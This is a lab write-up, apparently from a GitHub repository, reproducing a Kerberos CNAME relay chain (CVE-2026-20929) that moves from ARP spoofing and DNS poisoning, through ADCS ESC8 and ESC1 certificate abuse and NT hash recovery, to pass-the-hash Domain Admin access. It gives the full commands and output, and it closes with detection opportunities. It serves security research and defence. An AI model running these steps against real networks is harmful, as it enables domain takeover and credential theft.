# Kerberos CNAME Relay → ADCS ESC8 → ESC1 → Domain Admin

**CVE-2026-20929 | Based on Cymulate Research (January 2026)**

---

## Lab Topology

```
┌─────────────────────────────────────────────────────┐
│                  192.168.1.0/24                     │
│                                                     │
│  ┌──────────────┐    ┌──────────────┐    ┌────────┐ │
│  │   DC01       │    │   WEB01B     │    │  Kali  │ │
│  │ Windows 2019 │    │ Windows 2019 │    │ Linux  │ │
│  │ 192.168.1.4  │    │ 192.168.1.242│    │.1.218  │ │
│  │              │    │              │    │        │ │
│  │ - AD DS      │    │ - Domain     │    │Attacker│ │
│  │ - ADCS       │    │   joined     │    │        │ │
│  │ - IIS/certsrv│    │ - jsmith     │    │        │ │
│  │ - DNS        │    │   logged in  │    │        │ │
│  └──────────────┘    └──────────────┘    └────────┘ │
│                                                     │
│  ELK Stack: 192.168.1.250 (bare metal, Ubuntu)      │
└─────────────────────────────────────────────────────┘

Domain: lab2019.local
Victim user: jsmith (low-priv, SeChangeNotifyPrivilege only)
CA: lab2019-WIN-JOCP945SK51-CA
```

---

## Lab Setup Issues & Fixes

### 1. WEB01B on wrong subnet
WEB01B was on 192.168.230.0/24 (VMware NAT). ARP spoofing is L2 — requires same broadcast domain.  
**Fix:** Changed VMware adapter to Bridged. WEB01B picked up 192.168.1.242 via DHCP.

### 2. WEB01B machine account missing from AD
Secure channel broken — `Test-ComputerSecureChannel` returned False. Machine account `WEB01B$` not present in AD.  
**Fix:** Windows reported it was already domain-joined despite missing machine account. Rejoining recreated the account and restored the secure channel.

### 3. IPv6 DNS overriding static DNS on WEB01B
Even after setting DNS to 192.168.1.4, WEB01B queried an ISP IPv6 DNS server, bypassing DC01.  
**Fix:** `Disable-NetAdapterBinding -Name "Ethernet0" -ComponentID ms_tcpip6`

### 4. VMware blocking promiscuous mode
mitm6 requires promiscuous mode to intercept DNS queries. VMware blocked it at the hypervisor.  
**Fix:** `sudo chmod a+rw /dev/vmnet0 /dev/vmnet8` on the Ubuntu host.

### 5. mitm6 CNAME fork requires IPv6 link-local
The tool requires an IPv6 link-local address on the interface even in `--only-dns` mode.  
**Fix:** `sudo ip addr add fe80::1/64 dev eth0 scope link`

### 6. Missing CDP container in AD
ADCS couldn't publish CRLs — `CN=DC01,CN=CDP,...` container missing from configuration partition.  
**Fix:**
```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
New-ADObject -Name "DC01" -Type "container" -Path "CN=CDP,CN=Public Key Services,CN=Services,$configNC"
New-ADObject -Name "lab2019-WIN-JOCP945SK51-CA" -Type "cRLDistributionPoint" -Path "CN=DC01,CN=CDP,CN=Public Key Services,CN=Services,$configNC"
certutil -crl
```

### 7. CA RPC endpoint not registering
IIS Web Enrollment could not reach the CA via RPC — `CCertRequest::Submit: The RPC server is unavailable. 0x800706ba`.  
Root cause: corrupted ADCS installation from prior lab use.  
**Fix:** Full ADCS reinstall:
```powershell
Remove-WindowsFeature ADCS-Web-Enrollment
Remove-WindowsFeature ADCS-Cert-Authority
# reboot
Install-WindowsFeature ADCS-Cert-Authority, ADCS-Web-Enrollment -IncludeManagementTools
Install-AdcsCertificationAuthority -CAType EnterpriseRootCA -CACommonName "lab2019-WIN-JOCP945SK51-CA" -KeyLength 2048 -HashAlgorithmName SHA256 -OverwriteExistingKey -Force
Install-AdcsWebEnrollment -Force
```

### 8. CA enforcing encrypted RPC requests
Reinstall reset interface flags to enforce encrypted RPC — IIS app pool can't negotiate encrypted RPC locally.  
**Note:** These flags are a hardening configuration not present in default ADCS installs. Clearing them reflects default installation state.  
**Fix:**
```powershell
certutil -setreg ca\interfaceflags -512
certutil -setreg ca\interfaceflags -1024
Restart-Service certsvc
```

### 9. ESC8Test template missing UPN SAN
krbrelayx was issuing certs with `CN=jsmith` but no Subject Alternative Name UPN. `gettgtpkinit.py` requires UPN for PKINIT.  
**Fix:** Switched to the built-in `User` template which correctly includes `othername: UPN:jsmith@lab2019.local` in the SAN.

### 10. Machine account ticket captured instead of user ticket
krbrelayx was issuing certs as `unknown9156$` — background WPAD traffic from the machine account triggering the relay.  
**Fix:** Added `--victim jsmith` to krbrelayx to filter for the target user's ticket only.

---

## Attack Chain

### Phase 1: MITM Position (ARP Spoofing)

```bash
# Enable IP forwarding
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

# Poison victim → tell WEB01B that Kali is the gateway
sudo arpspoof -i eth0 -t 192.168.1.242 192.168.1.1

# Poison gateway → tell router that Kali is WEB01B
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.242
```

All traffic between WEB01B and the gateway now flows through Kali transparently.

---

### Phase 2: DNS CNAME Poisoning (mitm6 CNAME fork)

```bash
sudo python3 mitm6-cname.py \
  -d lab2019.local \
  --cname-source-all \
  --cname dc01.lab2019.local \
  --only-dns
```

When WEB01B resolves any internal hostname, Kali responds with:
- A CNAME record pointing the requested hostname → `dc01.lab2019.local`
- An A record pointing `dc01.lab2019.local` → Kali's IP (192.168.1.218)

WEB01B's Kerberos client follows the CNAME and requests a TGS for `dc01.lab2019.local` instead of the original hostname. This is the SPN coercion primitive.

---

### Phase 3: Kerberos Relay → ADCS ESC8

```bash
sudo python3 krbrelayx.py \
  --target http://dc01.lab2019.local/certsrv/certfnsh.asp \
  --adcs \
  --template User \
  --victim jsmith
```

When jsmith's browser makes any HTTP request to an internal hostname:
1. DNS query intercepted → CNAME poisoned → WEB01B connects to Kali
2. Kali presents an HTTP 401 → WEB01B authenticates with Kerberos
3. jsmith's TGS for `dc01.lab2019.local` is forwarded to the real certsrv
4. certsrv accepts the ticket (no CBT enforcement on HTTP)
5. krbrelayx submits a CSR and receives a certificate for jsmith

```
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./jsmith.pfx
[*] Certificate successfully written to file
```

**Trigger from WEB01B as jsmith:**
```powershell
Invoke-WebRequest -Uri "http://fileserver.lab2019.local/" -UseDefaultCredentials
```

---

### Phase 4: PKINIT → jsmith TGT + NT Hash

```bash
# Get TGT using the certificate
python3 gettgtpkinit.py \
  -cert-pfx ~/jsmith.pfx \
  -dc-ip 192.168.1.4 \
  lab2019.local/jsmith \
  jsmith.ccache

# Recover NT hash via U2U
export KRB5CCNAME=jsmith.ccache
python3 getnthash.py \
  -key 14f4a5232dc5d674b7eb4fa2caadaa50495247ade36f8966e58fec24c777b0f3 \
  -dc-ip 192.168.1.4 \
  lab2019.local/jsmith

# Result:
# Recovered NT Hash: 2b576acbe6bcfda7294d6bd18041b8fe
```

jsmith validated — no admin access:
```
SMB  DC01  [+] lab2019.local\jsmith:2b576acbe6bcfda7294d6bd18041b8fe
ADMIN$      (no permissions)
C$          (no permissions)
```

---

### Phase 5: ADCS ESC1 → Domain Admin

Certipy enumeration with jsmith's hash revealed ESC1 on the ESC8Test template:
- Enrollee supplies subject
- Client authentication EKU enabled  
- Authenticated Users can enroll
- No manager approval required

```bash
certipy find \
  -u jsmith@lab2019.local \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
  -dc-ip 192.168.1.4 \
  -vulnerable \
  -ldap-scheme ldap
```

Request a certificate with Administrator's UPN and SID:
```bash
certipy req \
  -u jsmith@lab2019.local \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
  -dc-ip 192.168.1.4 \
  -ca lab2019-WIN-JOCP945SK51-CA \
  -template ESC8Test \
  -upn administrator@lab2019.local \
  -sid S-1-5-21-3984567624-304424726-3877085034-500 \
  -ldap-scheme ldap

# [*] Got certificate with UPN 'administrator@lab2019.local'
# [*] Certificate object SID is 'S-1-5-21-3984567624-304424726-3877085034-500'
```

Authenticate and recover Administrator hash:
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.4

# [*] Got hash for 'administrator@lab2019.local':
# aad3b435b51404eeaad3b435b51404ee:3c02b6b6fb6b3b17242dc33a31bc011f
```

Pass the hash → Domain Admin:
```bash
nxc smb 192.168.1.4 -u administrator -H 3c02b6b6fb6b3b17242dc33a31bc011f --shares

# [+] lab2019.local\administrator:3c02b6b6fb6b3b17242dc33a31bc011f (Pwn3d!)
# ADMIN$   READ,WRITE
# C$       READ,WRITE
```

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| MITM | ARP spoofing | arpspoof |
| DNS poison | CNAME abuse | mitm6-cname fork |
| Kerberos relay | ESC8 (HTTP, no CBT) | krbrelayx |
| Cert → TGT | PKINIT | gettgtpkinit.py |
| TGT → hash | U2U S4U2Self | getnthash.py |
| Privilege escalation | ESC1 (enrollee supplies subject) | certipy |
| DA access | Pass-the-hash | nxc |

**Start:** `jsmith` — domain user, `SeChangeNotifyPrivilege` only  
**End:** `administrator` — Domain Admin, full DC access  
**Credentials cracked:** 0  
**Exploits used:** 0

---

## Detection Opportunities

- Anomalous internal CNAME responses in DNS logs (DC01 DNS debug logging)
- HTTP-class SPN in TGS-REQ followed by certificate enrollment (Sysmon EID 4768 + CA audit EID 4886)
- Low-privileged user enrolling certificate with DA UPN (CA audit EID 4886 — requestor vs certificate subject mismatch)
- PKINIT AS-REQ from accounts with no prior certificate authentication history
- Pass-the-hash pattern: NTLM auth from non-standard source IP for DA account

---

## References

- [Cymulate: Kerberos Authentication Relay Via CNAME Abuse (Jan 2026)](https://cymulate.com)
- [BenZamir/MITM6-Kerberos-CNAME-Abuse](https://github.com/BenZamir/MITM6-Kerberos-CNAME-Abuse)
- [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [ly4k/Certipy](https://github.com/ly4k/certipy)
- CVE-2026-20929

<img width="1858" height="658" alt="arpspoofplumbing" src="https://github.com/user-attachments/assets/9c828beb-a3db-4126-a909-62c3e7830c97" />
<img width="1197" height="471" alt="kaliipmac" src="https://github.com/user-attachments/assets/021acff6-a5d4-4b01-82aa-b88c5681fc27" />
<img width="633" height="637" alt="mapkalimactoDCIP" src="https://github.com/user-attachments/assets/1bb6eb23-93cf-4998-995a-6cd654841b4c" />
<img width="941" height="469" alt="MITM6SPOOFEDREPLIES" src="https://github.com/user-attachments/assets/8e4e277a-8837-4bd6-af4d-5204a037f83e" />
<img width="1525" height="80" alt="CertificateidentityJSMITH" src="https://github.com/user-attachments/assets/d373cf4e-01b5-4dce-9105-de0533c9af30" />
<img width="921" height="449" alt="relayx" src="https://github.com/user-attachments/assets/f81984fa-fa3a-4160-8a59-c66c6f16704b" />
<img width="1468" height="223" alt="jsmithtgtsavedtoccache" src="https://github.com/user-attachments/assets/ba6721a7-1249-41c7-a96f-b822630ea9ab" />
<img width="1697" height="130" alt="RECOVEREDNTHASHJSMITH" src="https://github.com/user-attachments/assets/9760ffbe-3a72-47b3-a533-05c7d8e9819c" />
<img width="1335" height="316" alt="2026-03-29_16-16ADMINHASHVIAPKINIT" src="https://github.com/user-attachments/assets/7f5e341f-21d7-4852-9781-c074eb362788" />
<img width="1856" height="300" alt="NXCWITHJSMITHHASH" src="https://github.com/user-attachments/assets/fb2ecaca-302d-4fa4-907c-79e9d29d7efe" />
<img width="1813" height="293" alt="NXCWITHADMINHASH" src="https://github.com/user-attachments/assets/f6cc9c69-d5a9-4d3c-8e38-090d68581428" />
<img width="1400" height="404" alt="HACKERACCOUNTADDED" src="https://github.com/user-attachments/assets/c1e5a656-f4d8-44e1-8b75-8dc2233722f6" />
<img width="1172" height="822" alt="HACKERACCOUNTADDEDPRIV" src="https://github.com/user-attachments/assets/74679282-b57b-4e7d-ae88-547d342ac75e" />















